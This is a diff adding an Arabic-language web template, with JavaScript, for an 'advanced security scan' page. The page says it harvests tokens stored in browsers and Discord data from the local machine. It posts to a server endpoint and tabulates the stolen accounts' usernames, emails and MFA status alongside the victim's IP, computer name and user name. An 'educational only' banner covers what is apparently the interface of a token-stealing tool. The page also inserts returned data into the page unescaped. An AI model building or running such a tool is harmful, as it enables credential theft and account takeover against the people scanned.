@@ -1,0 +1,258 @@
+{% extends "base.html" %}
+
+{% block title %}فحص الأمان المتقدم - أدوات الأمن السيبراني{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header bg-danger text-white">
+                <h4><i class="fas fa-search me-2"></i>فحص الأمان المتقدم</h4>
+                <small>للمدراء فقط - للأغراض التعليمية والبحثية</small>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-body">
+                <h5 class="card-title">
+                    <i class="fas fa-exclamation-triangle text-warning me-2"></i>
+                    تحذير مهم
+                </h5>
+                <div class="alert alert-warning">
+                    <strong>تنبيه:</strong> هذا الفحص مخصص للأغراض التعليمية فقط. 
+                    يجب الحصول على إذن قانوني قبل فحص أي نظام لا تملكه.
+                </div>
+                
+                <h6>ما يقوم به هذا الفحص:</h6>
+                <ul>
+                    <li>فحص tokens المحفوظة محلياً في المتصفحات</li>
+                    <li>تحليل بيانات Discord المخزنة</li>
+                    <li>عرض معلومات النظام الأساسية</li>
+                    <li>تسجيل العمليات للمراجعة</li>
+                </ul>
+                
+                <div class="mt-4">
+                    <button id="startScan" class="btn btn-danger btn-lg" onclick="startSecurityScan()">
+                        <i class="fas fa-play me-2"></i>بدء الفحص الأمني
+                    </button>
+                    <button id="stopScan" class="btn btn-secondary btn-lg d-none" onclick="stopScan()">
+                        <i class="fas fa-stop me-2"></i>إيقاف الفحص
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header bg-info text-white">
+                <h6><i class="fas fa-info-circle me-2"></i>معلومات الفحص</h6>
+            </div>
+            <div class="card-body">
+                <div class="mb-3">
+                    <strong>حالة الفحص:</strong>
+                    <span id="scanStatus" class="badge bg-secondary">جاهز</span>
+                </div>
+                <div class="mb-3">
+                    <strong>الوقت المقدر:</strong>
+                    <span class="text-muted">10-30 ثانية</span>
+                </div>
+                <div class="mb-3">
+                    <strong>المتصفحات المدعومة:</strong>
+                    <ul class="list-unstyled small mt-2">
+                        <li><i class="fab fa-chrome text-warning me-1"></i> Chrome</li>
+                        <li><i class="fab fa-firefox text-orange me-1"></i> Firefox</li>
+                        <li><i class="fab fa-edge text-info me-1"></i> Edge</li>
+                        <li><i class="fab fa-opera text-danger me-1"></i> Opera</li>
+                        <li>+ متصفحات أخرى</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-terminal me-2"></i>نتائج الفحص</h5>
+            </div>
+            <div class="card-body">
+                <div id="scanResults" class="d-none">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h6>معلومات النظام:</h6>
+                            <div id="systemInfo"></div>
+                        </div>
+                        <div class="col-md-6">
+                            <h6>النتائج المكتشفة:</h6>
+                            <div id="discoveredTokens"></div>
+                        </div>
+                    </div>
+                    <div class="mt-3">
+                        <h6>تفاصيل النتائج:</h6>
+                        <div id="detailedResults"></div>
+                    </div>
+                </div>
+                
+                <div id="scanProgress" class="d-none">
+                    <div class="text-center">
+                        <div class="spinner-border text-primary" role="status">
+                            <span class="visually-hidden">جاري الفحص...</span>
+                        </div>
+                        <p class="mt-2">جاري تنفيذ الفحص الأمني...</p>
+                        <div class="progress">
+                            <div id="progressBar" class="progress-bar progress-bar-striped progress-bar-animated" 
+                                 role="progressbar" style="width: 0%"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="noScanResults">
+                    <div class="text-center text-muted">
+                        <i class="fas fa-search fa-3x mb-3"></i>
+                        <p>اضغط على "بدء الفحص الأمني" لتشغيل الأداة</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+{% endblock %}
+
+{% block scripts %}
+<script>
+let scanInProgress = false;
+
+function startSecurityScan() {
+    if (scanInProgress) return;
+    
+    scanInProgress = true;
+    
+    // تحديث واجهة المستخدم
+    document.getElementById('startScan').classList.add('d-none');
+    document.getElementById('stopScan').classList.remove('d-none');
+    document.getElementById('scanStatus').textContent = 'جاري التنفيذ';
+    document.getElementById('scanStatus').className = 'badge bg-warning';
+    
+    document.getElementById('noScanResults').classList.add('d-none');
+    document.getElementById('scanResults').classList.add('d-none');
+    document.getElementById('scanProgress').classList.remove('d-none');
+    
+    // محاكاة شريط التقدم
+    let progress = 0;
+    const progressInterval = setInterval(() => {
+        progress += Math.random() * 20;
+        if (progress > 90) progress = 90;
+        document.getElementById('progressBar').style.width = progress + '%';
+    }, 500);
+    
+    // إرسال طلب الفحص
+    fetch('/execute-scan', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        clearInterval(progressInterval);
+        document.getElementById('progressBar').style.width = '100%';
+        
+        setTimeout(() => {
+            displayResults(data);
+            scanInProgress = false;
+            
+            document.getElementById('startScan').classList.remove('d-none');
+            document.getElementById('stopScan').classList.add('d-none');
+            document.getElementById('scanStatus').textContent = 'مكتمل';
+            document.getElementById('scanStatus').className = 'badge bg-success';
+            document.getElementById('scanProgress').classList.add('d-none');
+        }, 1000);
+    })
+    .catch(error => {
+        clearInterval(progressInterval);
+        console.error('خطأ في الفحص:', error);
+        
+        document.getElementById('scanProgress').classList.add('d-none');
+        document.getElementById('noScanResults').classList.remove('d-none');
+        document.getElementById('noScanResults').innerHTML = 
+            '<div class="alert alert-danger">حدث خطأ أثناء الفحص: ' + error.message + '</div>';
+        
+        scanInProgress = false;
+        document.getElementById('startScan').classList.remove('d-none');
+        document.getElementById('stopScan').classList.add('d-none');
+        document.getElementById('scanStatus').textContent = 'خطأ';
+        document.getElementById('scanStatus').className = 'badge bg-danger';
+    });
+}
+
+function stopScan() {
+    scanInProgress = false;
+    document.getElementById('startScan').classList.remove('d-none');
+    document.getElementById('stopScan').classList.add('d-none');
+    document.getElementById('scanStatus').textContent = 'متوقف';
+    document.getElementById('scanStatus').className = 'badge bg-secondary';
+    document.getElementById('scanProgress').classList.add('d-none');
+    document.getElementById('noScanResults').classList.remove('d-none');
+}
+
+function displayResults(data) {
+    document.getElementById('scanResults').classList.remove('d-none');
+    
+    // عرض معلومات النظام
+    const systemInfo = document.getElementById('systemInfo');
+    systemInfo.innerHTML = `
+        <div class="small">
+            <strong>IP:</strong> ${data.ip_address || 'غير متاح'}<br>
+            <strong>اسم الجهاز:</strong> ${data.computer_name || 'غير متاح'}<br>
+            <strong>المستخدم:</strong> ${data.username || 'غير متاح'}
+        </div>
+    `;
+    
+    // عرض عدد النتائج
+    const discoveredTokens = document.getElementById('discoveredTokens');
+    discoveredTokens.innerHTML = `
+        <div class="small">
+            <strong>عدد النتائج:</strong> ${data.total_tokens_found || 0}<br>
+            <strong>الحالة:</strong> ${data.status || 'غير معروف'}
+        </div>
+    `;
+    
+    // عرض التفاصيل
+    const detailedResults = document.getElementById('detailedResults');
+    if (data.results && data.results.length > 0) {
+        let resultsHtml = '<div class="table-responsive"><table class="table table-sm table-striped">';
+        resultsHtml += '<thead><tr><th>المنصة</th><th>المستخدم</th><th>البريد</th><th>التحقق</th><th>MFA</th></tr></thead><tbody>';
+        
+        data.results.forEach(result => {
+            resultsHtml += `
+                <tr>
+                    <td>${result.platform}</td>
+                    <td>${result.username}</td>
+                    <td>${result.email}</td>
+                    <td>${result.verified ? '<i class="fas fa-check text-success"></i>' : '<i class="fas fa-times text-danger"></i>'}</td>
+                    <td>${result.mfa_enabled ? '<i class="fas fa-check text-success"></i>' : '<i class="fas fa-times text-danger"></i>'}</td>
+                </tr>
+            `;
+        });
+        
+        resultsHtml += '</tbody></table></div>';
+        detailedResults.innerHTML = resultsHtml;
+    } else {
+        detailedResults.innerHTML = '<div class="alert alert-info">لم يتم العثور على نتائج</div>';
+    }
+    
+    // عرض الملاحظة التعليمية
+    if (data.educational_note) {
+        detailedResults.innerHTML += `<div class="alert alert-warning mt-3"><small>${data.educational_note}</small></div>`;
+    }
+}
+</script>
+{% endblock %}
